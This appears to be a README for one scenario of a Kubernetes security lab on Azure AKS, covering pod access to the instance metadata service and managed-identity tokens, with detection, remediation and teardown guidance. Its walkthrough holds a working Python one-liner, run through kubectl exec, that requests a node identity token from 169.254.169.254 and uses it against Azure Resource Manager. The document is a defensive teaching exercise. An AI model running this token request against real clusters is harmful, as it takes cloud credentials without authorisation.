# Scenario 09 — AKS IMDS and Managed Identity Exposure

| | |
|---|---|
| **Vulnerability class** | Cloud identity / metadata service |
| **Difficulty** | ⭐⭐⭐⭐ Hard |
| **Backend** | AKS only |
| **Namespace** | `aks-imds` |
| **MITRE ATT&CK for Containers** | [T1552.005 Cloud Instance Metadata API](https://attack.mitre.org/techniques/T1552/005/) |

## What it is

Azure Instance Metadata Service (IMDS) is a link-local endpoint used by a VM to
obtain metadata and, where configured, managed-identity tokens. A compromised
pod that can reach node IMDS may be able to request a token for an identity
attached to the node. This scenario creates a minimal pod with Kubernetes API
token automount disabled; it does not create a public service or grant Azure
permissions.

## Why it matters

Kubernetes RBAC and Azure RBAC are separate boundaries. A low-privilege pod
should not inherit the node's cloud identity merely because it runs on that
node. If IMDS is reachable and the node identity has broad Azure permissions,
an application compromise can become a cloud compromise. Modern AKS
configurations and identity modes can block or change this path; a failed probe
is a valid result and must not be worked around by exposing IMDS or weakening
the cluster.

## Deploy just this scenario

Only deploy this to the isolated AKS backend with a valid `/32` API allow-list:

```powershell
./up.ps1 -Backend aks -Scenarios 09-aks-imds-managed-identity -AutoDestroyHours 3
```

Do not use `kind` for this exercise; kind nodes are local containers and have no
Azure managed identity. Do not add a public `Service`, `NodePort`, or
`LoadBalancer`.

## Exploit walkthrough — read-only probe

From PowerShell, find the pod and run a bounded Python probe. The code prints
only the identity client ID and whether a read-only ARM subscription-list
request is permitted; it deliberately does **not** print or persist the bearer
token and does not modify Azure resources:

```powershell
$pod = kubectl -n aks-imds get pod -l app=imds-probe -o jsonpath='{.items[0].metadata.name}'
$probe = 'import json,urllib.request; u="http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F"; r=urllib.request.Request(u,headers={"Metadata":"true"}); d=json.load(urllib.request.urlopen(r,timeout=3)); print("client_id:",d.get("client_id")); t=d["access_token"]; q=urllib.request.Request("https://management.azure.com/subscriptions?api-version=2020-01-01",headers={"Authorization":"Bearer "+t}); x=urllib.request.urlopen(q,timeout=5); print("ARM subscription-list HTTP:",x.status)'
kubectl -n aks-imds exec $pod -- python3 -c $probe
```

## What success looks like

The pod either cannot reach IMDS or receives a managed-identity response. If a
token is issued, the probe prints only the client ID and the HTTP status of the
read-only ARM subscription-list request; it never displays the token. A blocked
request or ARM `403` is also a valid result.

Interpret results carefully:

- An IMDS connection error or an authorization response means this path is
  blocked in this cluster/identity configuration.
- A token response confirms that the pod could request a node-attached identity
  token. A `403` from ARM means the identity lacks permission for that read.
- An ARM `200` means the identity can enumerate subscriptions. Stop at this
  read-only proof; do not try writes, role assignments, secret retrieval, or
  access to any other tenant or subscription.

Never save token JSON, print `access_token`, or paste it into logs/issues.

## Detection

- Inspect AKS network and identity controls for pod-to-IMDS traffic. A
  successful IMDS request from an application namespace is unexpected.
- Falco can show the process and outbound connection, but it does not by itself
  prove which Azure identity or ARM permission was used.
- Azure activity logs show ARM operations performed with the identity; the
  read-only probe above makes a subscription-list call only if the token permits
  it. The API-server audit log does not record IMDS token contents or cloud API
  authorization.

## Remediation

- Prefer workload identity with least-privilege Azure roles instead of relying
  on a shared node identity for application access.
- Restrict pod access to IMDS using the supported AKS identity/network controls
  for the cluster's configured networking mode; verify from an untrusted test
  pod that IMDS is blocked.
- Remove unnecessary role assignments from node/kubelet identities and scope
  required roles to the minimum resources/actions.
- Keep API and workload endpoints private or IP-restricted; never expose this
  pod to the Internet.

**Before:** an untrusted pod can query IMDS and obtain a broadly authorized node
identity token.

**After:** the pod cannot reach IMDS, and any workload identity has only
resource-scoped permissions it explicitly needs.

## Teardown

```powershell
./down.ps1 -Backend aks
az group exists --name $env:AKS_RESOURCE_GROUP
```

The final command must print `false`. If it does not, do not assume cleanup
succeeded; inspect the resource group and use the guarded teardown script.
